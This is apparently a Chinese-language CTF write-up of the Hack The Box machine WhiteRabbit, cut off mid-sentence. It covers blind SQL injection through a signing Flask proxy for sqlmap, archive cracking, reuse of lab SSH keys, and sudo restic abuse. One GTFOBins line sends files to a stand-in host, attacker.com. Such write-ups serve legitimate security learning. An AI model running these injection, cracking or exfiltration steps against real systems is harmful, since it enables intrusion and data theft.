{"pageProps":{"postData":{"id":"HackTheBoxSeason7-WhiteRabbit","contentHtml":"<h1>Season7-WhiteRabbit</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/competitive/7/overview\">https://app.hackthebox.com/competitive/7/overview</a> | <code>Insane</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  nmap -sT -min-rate 10000 -p- 10.10.11.63\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 23:29 EDT\nWarning: 10.10.11.63 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> whiterabbit.htb (10.10.11.63)\nHost is up (0.30s latency).\nNot shown: 34479 filtered tcp ports (no-response), 31053 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n2222/tcp open  EtherNetIP-1\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 150.51 seconds\n</code></pre>\n<p>将 <code>whiterabbit.htb</code> 写入 hosts 文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  nmap -sT -A -T4 -O -p 22,80,2222 10.10.11.63\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 23:32 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> whiterabbit.htb (10.10.11.63)\nHost is up (0.45s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)\n|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)\n80/tcp   open  http    Caddy httpd\n|_http-title: White Rabbit - Pentesting Services\n|_http-server-header: Caddy\n2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)\n|_  256 ad:42:c0:28:77:<span class=\"hljs-built_in\">dd</span>:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   457.81 ms 10.10.16.1\n2   294.36 ms whiterabbit.htb (10.10.11.63)\n</code></pre>\n<p>访问 <code>HTTP</code> 服务，<code>caddy</code> 搭建的 web</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  whatweb whiterabbit.htb                     \nhttp://whiterabbit.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.10.11.63], Script, Title[White Rabbit - Pentesting Services]\n</code></pre>\n<p>再爆一下子域名，爆出来 <code>status.whiterabbit.htb</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  gobuster vhost -u http://whiterabbit.htb --append-domain -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://whiterabbit.htb\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   <span class=\"hljs-literal\">true</span>\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> VHOST enumeration mode\n===============================================================\nFound: status.whiterabbit.htb Status: 302 [Size: 32] [--> /dashboard]\nFound: status.whiterabbit.htb Status: 302 [Size: 32] [--> /dashboard]\n</code></pre>\n<p>添加到 <code>hosts</code> ，再打开搭建的是 <code>Kuma</code> (Uptime Kuma is an easy-to-use self-hosted monitoring tool.</p>\n<p>Uptime Kuma 是一个易于使用的自托管监控工具。)</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image1.png\" alt=\"image.png\"></p>\n<h2>模糊测试</h2>\n<p>在<code>http://whiterabbit.htb</code> 中无法找到任何有效信息</p>\n<p><code>Kuma</code> 存在几个CVE，但是有的需要正常进入的凭据，或者就是难以利用</p>\n<p>对 <code>kuma</code> 进行目录扫描，也没扫出来什么</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  gobuster <span class=\"hljs-built_in\">dir</span> -u http://status.whiterabbit.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error --exclude-length 2444\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://status.whiterabbit.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   429,404,403,502\n[+] Exclude Length:          2444\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/screenshots          (Status: 301) [Size: 189] [--> /screenshots/]\n/assets               (Status: 301) [Size: 179] [--> /assets/]\n/upload               (Status: 301) [Size: 179] [--> /upload/]\n/Screenshots          (Status: 301) [Size: 189] [--> /Screenshots/]\n/metrics              (Status: 401) [Size: 0]\n/Upload               (Status: 301) [Size: 179] [--> /Upload/]\n</code></pre>\n<p>换个思路，我们对 <code>Kuma</code> 的 Docs 进行检索 ：<a href=\"https://github.com/louislam/uptime-kuma/wiki\">https://github.com/louislam/uptime-kuma/wiki</a></p>\n<p>找到了 <strong>Status Page</strong> ，格式为 <code>http://example.com/status/default</code> default 为特别的 slug</p>\n<p>为什么找 <code>Status Page</code>？因为监控需要提供 URl，提供的很有可能就是我们没有模糊测试出来的子域名</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image2.png\" alt=\"image.png\"></p>\n<p>从网上的文章中可以看到是自己配置的</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image3.png\" alt=\"image.png\"></p>\n<p>对其进行模糊测试</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl=38 -u http://status.whiterabbit.htb/status/FUZZ\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://status.whiterabbit.htb/status/FUZZ\nTotal requests: 220560\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                           \n=====================================================================\n\n000001471:   200        40 L     152 W      3359 Ch     <span class=\"hljs-string\">\"temp\"</span>         \n</code></pre>\n<p>模糊到<code>temp</code> ，访问一下，成功访问，并且找到子域名</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image4.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">ddb09a8558c9.whiterabbit.htb\na668910b5514e.whiterabbit.htb\n</code></pre>\n<p>都去访问一下<code>a668910b5514e.whiterabbit.htb</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image5.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image6.png\" alt=\"image.png\"></p>\n<p>在下面能找到：</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image7.png\" alt=\"image.png\"></p>\n<p>下载 <code>json</code> 文件查看（喂给GPT），这是 <code>n8n</code> 工作流</p>\n<p>密钥，数据包上的<code>x-gophish-signature: sha256=</code> 就是通过密钥加密了<code>Body</code>后得到的，所以每构造一个数据包就要重新使用密钥对<code>Body</code>进行加密</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-string\">\"parameters\"</span>: {\n        <span class=\"hljs-string\">\"action\"</span>: <span class=\"hljs-string\">\"hmac\"</span>,\n        <span class=\"hljs-string\">\"type\"</span>: <span class=\"hljs-string\">\"SHA256\"</span>,\n        <span class=\"hljs-string\">\"value\"</span>: <span class=\"hljs-string\">\"={{ JSON.stringify(<span class=\"hljs-variable\">$json</span>.body) }}\"</span>,\n        <span class=\"hljs-string\">\"dataPropertyName\"</span>: <span class=\"hljs-string\">\"calculated_signature\"</span>,\n        <span class=\"hljs-string\">\"secret\"</span>: <span class=\"hljs-string\">\"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS\"</span>\n}\n</code></pre>\n<p>这个整个 JSON，要以 <strong>字符串形式</strong> 参与 HMAC 计算：</p>\n<pre><code class=\"hljs language-perl\">\n{<span class=\"hljs-string\">\"campaign_id\"</span>:<span class=\"hljs-number\">1</span>,<span class=\"hljs-string\">\"email\"</span>:<span class=\"hljs-string\">\"test<span class=\"hljs-variable\">@ex</span>.com\"</span>,<span class=\"hljs-string\">\"message\"</span>:<span class=\"hljs-string\">\"Clicked Link\"</span>}\n</code></pre>\n<p>（注意：字段顺序不能变，空格会影响计算）</p>\n<h2>SQL 注入</h2>\n<p>这一处可能存在<code>SQL</code>注入</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-string\">\"parameters\"</span>: {\n        <span class=\"hljs-string\">\"operation\"</span>: <span class=\"hljs-string\">\"executeQuery\"</span>,\n        <span class=\"hljs-string\">\"query\"</span>: <span class=\"hljs-string\">\"SELECT * FROM victims where email = \\\"{{ <span class=\"hljs-variable\">$json</span>.body.email }}\\\" LIMIT 1\"</span>,\n        <span class=\"hljs-string\">\"options\"</span>: {}\n      },\n.....\n</code></pre>\n<p>触发的是对应的数据包<code>Webhook</code>上的<code>email</code>参数</p>\n<pre><code class=\"hljs language-bash\">POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1\nHost: 28efa8f7df.whiterabbit.htb\nx-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/json\nContent-Length: 81\n\n{\n  <span class=\"hljs-string\">\"campaign_id\"</span>: 1,\n  <span class=\"hljs-string\">\"email\"</span>: <span class=\"hljs-string\">\"test@ex.com\"</span>,\n  <span class=\"hljs-string\">\"message\"</span>: <span class=\"hljs-string\">\"Clicked Link\"</span>\n}\n</code></pre>\n<p>将<code>28efa8f7df.whiterabbit.htb</code>添加到<code>hosts</code>文件</p>\n<p>构造数据包</p>\n<pre><code class=\"hljs language-bash\">{<span class=\"hljs-string\">\"campaign_id\"</span>:2,<span class=\"hljs-string\">\"email\"</span>:<span class=\"hljs-string\">\"test\\\" -- -\"</span>,<span class=\"hljs-string\">\"message\"</span>:<span class=\"hljs-string\">\"Clicked Link\"</span>}\n</code></pre>\n<p>构造<code>sha256</code>，使用<code>cyberchef</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image8.png\" alt=\"image.png\"></p>\n<p>闭合成功，存在 <code>SQL</code> 注入</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image9.png\" alt=\"image.png\"></p>\n<p>看回显是无法使用联合查询了，只能使用布尔盲注时间盲注之类的，并且手工测试难度高时间长</p>\n<p>编写脚本（参考大佬的脚本改编的，学习思路）</p>\n<pre><code class=\"hljs language-bash\">import hmac\nimport hashlib\nimport json\nimport flask\nimport requests\napp = flask.Flask(__name__)\n\nurl = <span class=\"hljs-string\">'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d'</span>\nsecret = <span class=\"hljs-string\">\"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS\"</span>\n\ndata = {\n    <span class=\"hljs-string\">\"campaign_id\"</span>: 2,\n    <span class=\"hljs-string\">\"message\"</span>: <span class=\"hljs-string\">\"Clicked Link\"</span>\n}\n\n<span class=\"hljs-comment\"># 开启 Flask 服务器，将 sqlmap 的请求通过 Flask 传递到靶机上</span>\n@app.route(<span class=\"hljs-string\">'/webhook'</span>, methods=[<span class=\"hljs-string\">'GET'</span>])\ndef _():\n    <span class=\"hljs-comment\"># 首先检查参数email是否存在</span>\n    email = flask.request.values.get(<span class=\"hljs-string\">'email'</span>)\n    <span class=\"hljs-keyword\">if</span> email is None:\n        <span class=\"hljs-built_in\">return</span> flask.abort(400)\n    try:\n        <span class=\"hljs-comment\"># 存在则拼接 data</span>\n        e = data.copy()\n        e[<span class=\"hljs-string\">'email'</span>] = email\n        new_data = json.dumps(e, separators=(<span class=\"hljs-string\">','</span>, <span class=\"hljs-string\">':'</span>))\n        <span class=\"hljs-comment\"># 生成签名</span>\n        signature = hmac.new(\n            secret.encode(),\n            new_data.encode(),\n            hashlib.sha256\n        ).hexdigest()\n        <span class=\"hljs-comment\"># 设置头部</span>\n        headers = {<span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json'</span>,<span class=\"hljs-string\">'x-gophish-signature'</span>: f<span class=\"hljs-string\">\"sha256={signature}\"</span>}\n        <span class=\"hljs-comment\"># 使用参数请求靶机</span>\n        r = requests.post(url, data=new_data, headers=headers)\n        <span class=\"hljs-comment\"># 将响应返回给Sqlmap</span>\n        <span class=\"hljs-built_in\">print</span>(r.text)\n        <span class=\"hljs-built_in\">return</span> r.text\n    except Exception as e:\n        <span class=\"hljs-built_in\">return</span> flask.abort(400)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    app.run(host=<span class=\"hljs-string\">'0.0.0.0'</span>, port=5000, debug=True)\n</code></pre>\n<pre><code class=\"hljs language-bash\">python sql.py\nsqlmap -u 127.0.0.1:5000/webhook?email=<span class=\"hljs-built_in\">test</span> --level=5 --risk=3\n</code></pre>\n<p>超级慢</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  sqlmap -u <span class=\"hljs-string\">\"127.0.0.1:5000/webhook?email=test\"</span> --level=5 --risk=3 --dbms=mysql --technique=B\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.8.11#stable}\n|_ -| . [<span class=\"hljs-string\">\"]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 05:36:21 /2025-04-07/\n\n[05:36:21] [INFO] testing connection to the target URL\n[05:36:30] [INFO] testing if the target URL content is stable\n[05:36:34] [INFO] target URL content is stable\n[05:36:34] [INFO] testing if GET parameter 'email' is dynamic\n[05:36:37] [WARNING] GET parameter 'email' does not appear to be dynamic\n[05:36:44] [INFO] heuristic (basic) test shows that GET parameter 'email' might be injectable (possible DBMS: 'MySQL')\n[05:36:48] [INFO] testing for SQL injection on GET parameter 'email'\n[05:36:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[05:39:24] [WARNING] reflective value(s) found and filtering out\n[05:45:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[05:51:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'\n[05:57:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[05:57:57] [INFO] GET parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable \n[05:57:57] [INFO] checking if the injection point on GET parameter 'email' is a false positive\n\nsqlmap identified the following injection point(s) with a total of 331 HTTP(s) requests:\n---\nParameter: email (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: email=test\"</span> AND 5729=(SELECT (CASE WHEN (5729=5729) THEN 5729 ELSE (SELECT 2985 UNION SELECT 6251) END))-- -\n---\n[06:03:10] [INFO] testing MySQL\n[06:03:15] [INFO] confirming MySQL\n[06:03:29] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0.0 (MariaDB fork)\n[06:03:34] [INFO] fetched data logged to text files under <span class=\"hljs-string\">'/root/.local/share/sqlmap/output/127.0.0.1'</span>\n\n[*] ending @ 06:03:34 /2025-04-07/\n</code></pre>\n<p>通过表查询的到下面的表内容</p>\n<pre><code class=\"hljs language-bash\">Database: temp\nTable: command_log\n[6 entries]\n+----+---------------------+------------------------------------------------------------------------------+\n| <span class=\"hljs-built_in\">id</span> | <span class=\"hljs-built_in\">date</span>                | <span class=\"hljs-built_in\">command</span>                                                                      |\n+----+---------------------+------------------------------------------------------------------------------+\n| 1  | 2024-08-30 10:44:01 | <span class=\"hljs-built_in\">uname</span> -a                                                                     |\n| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |\n| 3  | 2024-08-30 11:58:36 | <span class=\"hljs-built_in\">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |\n| 4  | 2024-08-30 11:59:02 | <span class=\"hljs-built_in\">rm</span> -rf .bash_history                                                         |\n| 5  | 2024-08-30 11:59:47 | <span class=\"hljs-comment\">#thatwasclose                                                                |</span>\n| 6  | 2024-08-30 14:40:42 | <span class=\"hljs-built_in\">cd</span> /home/neo/ &#x26;&#x26; /opt/neo-password-generator/neo-password-generator | passwd |\n+----+---------------------+------------------------------------------------------------------------------+\n</code></pre>\n<h2>Restic</h2>\n<p>可以看到使用restic来备份数据，密码也泄露了，所以我们直接恢复数据</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  restic -r rest:http://75951e6ff.whiterabbit.htb restore latest --target ./bak\nenter password <span class=\"hljs-keyword\">for</span> repository: \nrepository 5b26a938 opened (version 2, compression level auto)\n[0:08] 100.00%  5 / 5 index files loaded\nrestoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to ./bak\nSummary: Restored 5 files/dirs (572 B) <span class=\"hljs-keyword\">in</span> 0:07\n</code></pre>\n<p>能得到一个<code>7z</code>文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  <span class=\"hljs-built_in\">ls</span>\nbob.7z\n</code></pre>\n<p>解压需要密码，开膛手就绪</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  7z2john bob.7z > 7z_hash \nATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes\n \n⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  john --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash            \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])\nCost 1 (iteration count) is 524288 <span class=\"hljs-keyword\">for</span> all loaded hashes\nCost 2 (padding size) is 3 <span class=\"hljs-keyword\">for</span> all loaded hashes\nCost 3 (compression <span class=\"hljs-built_in\">type</span>) is 2 <span class=\"hljs-keyword\">for</span> all loaded hashes\nCost 4 (data length) is 365 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 16 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n1q2w3e4r5t6y     (bob.7z)     \n1g 0:00:03:12 DONE (2025-04-07 05:49) 0.005185g/s 124.1p/s 124.1c/s 124.1C/s 241287..shanefilan\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>得到密码<code>1q2w3e4r5t6y</code> ，进行解压</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  <span class=\"hljs-built_in\">ls</span>\n7z_hash  bob  bob.7z  bob.pub  config\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  <span class=\"hljs-built_in\">cat</span> config             \nHost whiterabbit\n  HostName whiterabbit.htb\n  Port 2222\n  User bob\n ⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  <span class=\"hljs-built_in\">cat</span> bob   \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC\nVwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w\nAAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE\nFMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=\n-----END OPENSSH PRIVATE KEY-----\n ⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  <span class=\"hljs-built_in\">cat</span> bob.pub \nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy\n</code></pre>\n<p>使用<code>SSH</code>私钥进行登录，默认端口需要密码</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh bob@10.10.11.63 -i bob\nbob@10.10.11.63<span class=\"hljs-string\">'s password: \n</span></code></pre>\n<p>尝试 <code>2222</code> 端口</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh bob@10.10.11.63 -i bob -p 2222\nThe authenticity of host <span class=\"hljs-string\">'[10.10.11.63]:2222 ([10.10.11.63]:2222)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>[10.10.11.63]:2222<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\nWelcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the '</span>unminimize<span class=\"hljs-string\">' command.\nLast login: Sun Apr  6 20:29:14 2025 from 10.10.14.118\nbob@ebdce80611e9:~$ \n</span></code></pre>\n<h2>提权 - morpheus</h2>\n<p>寻找<code>user.txt</code> ,没找到，那么还需要操作..</p>\n<pre><code class=\"hljs language-bash\">find / -name user.txt 2>/dev/null\n</code></pre>\n<p>查看权限，可以以<code>Root</code>权限执行<code>restic</code></p>\n<pre><code class=\"hljs language-bash\">bob@ebdce80611e9:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> bob on ebdce80611e9:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser bob may run the following commands on ebdce80611e9:\n    (ALL) NOPASSWD: /usr/bin/restic\n</code></pre>\n<p>在 <a href=\"https://gtfobins.github.io/gtfobins/restic/\">https://gtfobins.github.io/gtfobins/restic/</a> 能找到利用方法，获取文件</p>\n<pre><code class=\"hljs language-bash\">// 利用方法\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n<span class=\"hljs-built_in\">sudo</span> restic backup -r <span class=\"hljs-string\">\"rest:http://<span class=\"hljs-variable\">$RHOST</span>:<span class=\"hljs-variable\">$RPORT</span>/<span class=\"hljs-variable\">$NAME</span>\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LFILE</span>\"</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> restic init -r /tmp/bak\n<span class=\"hljs-built_in\">sudo</span> restic backup -r <span class=\"hljs-string\">\"/tmp/bak\"</span> <span class=\"hljs-string\">\"/root\"</span>\n<span class=\"hljs-built_in\">sudo</span> restic -r /tmp/bak dump latest /root > data.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> data.txt\n....\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS\n1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP\nUtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx\nK0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w\nJa+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR\n4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp\nc3QBAg==\n-----END OPENSSH PRIVATE KEY-----                                                                     \nroot/morpheus.pub0000644000000000000000000000027214664326641014426 0ustar00rootroot00000000000000ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+wJa+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR4= morpheus@whiterabbit.htb\n</code></pre>\n<p>将私钥保存为<code>morpheus</code>后使用私钥进行登录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  ssh morpheus@10.10.11.63 -i morpheus\nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that <span class=\"hljs-built_in\">users</span> <span class=\"hljs-keyword\">do</span> not <span class=\"hljs-built_in\">log</span> into.\n\nTo restore this content, you can run the <span class=\"hljs-string\">'unminimize'</span> <span class=\"hljs-built_in\">command</span>.\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Mon Apr 7 10:23:46 2025 from 10.10.16.14\nmorpheus@whiterabbit:~$ \n</code></pre>\n<p>在当前目录下可以找到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">morpheus@whiterabbit:~$ <span class=\"hljs-built_in\">cat</span> user.txt\n7b5da670be642bef9c6969e85ee2da7b\n</code></pre>\n<h2>提权 - root</h2>\n<p>在之前<code>SQL</code>注入的时候能发现这个，感觉和提权是有关的</p>\n<pre><code class=\"hljs language-bash\"> <span class=\"hljs-built_in\">cd</span> /home/neo/ &#x26;&#x26; /opt/neo-password-generator/neo-password-generator | passwd \n</code></pre>\n<p>执行之后会生成一段密码</p>\n<pre><code class=\"hljs language-bash\">morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator \nruJ8Eyc9ZAIYVqPfUXo9\n</code></pre>\n<p>但是密码还是不对的</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit/bak/dev/shm/bob/ssh  ssh neo@10.10.11.63                 \nneo@10.10.11.63<span class=\"hljs-string\">'s password: \nPermission denied, please try again.       \n</span></code></pre>\n<p>将程序拉出来进行逆向（不会），使用好友的脚本</p>\n<blockquote>\n<p>大概就是<strong>获取当前时间</strong>（精确到微秒），并将其结果保存在传入的 <code>struct timeval</code> 类型变量中。</p>\n<p>然后使用时间戳（精度为毫秒）作为种子，调用 <code>generate_password</code> 函数。这个表达式的含义是：</p>\n<ul>\n<li><code>tv.tv_sec</code> 是当前的秒数</li>\n<li><code>tv.tv_usec / 1000</code> 是当前微秒数转为毫秒</li>\n<li>所以 <code>1000 